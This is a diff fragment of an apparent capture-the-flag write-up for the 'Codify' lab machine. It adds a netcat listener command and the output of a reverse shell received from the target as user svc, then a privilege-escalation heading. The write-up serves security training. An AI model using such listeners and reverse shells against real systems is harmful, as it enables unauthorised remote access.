@@ -123,4 +123,25 @@ Once the remote execution of commands has been verified, we proceed to establish
 
 <br />
 
+![8](../../../assets/images/Codify/8.png)
 
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.11.239] 43834
+bash: cannot set terminal process group (1267): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@codify:~$
+```
+
+<br />
+
+Once inside we sanitize the tty as always so that it is completely interactive and intrusion ready!!!
+
+<br />
+
+# Privilege Escalation: svc -> joshua
+
+<br />
